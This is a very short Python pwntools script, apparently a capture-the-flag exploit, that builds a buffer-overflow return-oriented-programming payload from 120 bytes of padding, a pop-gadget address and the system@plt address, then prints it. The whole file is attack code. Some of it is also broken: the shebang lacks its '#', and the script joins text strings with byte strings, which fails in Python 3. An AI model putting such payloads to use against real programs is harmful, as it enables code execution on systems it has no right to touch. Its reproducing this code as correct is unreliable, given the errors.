!/usr/bin/env python3

from pwn import *

# rop address 0x401206 
# 0x00401206 : pop r13; pop r14; pop r15; ret
# buffer length 120
# 40116e <system@plt>

buffer = "A" * 120
pop = p64(0x401206)
system = p64(0x40116e)

attack = buffer + pop + system + "BBBBBBBB" + "CCCCCCCC"

print(attack)
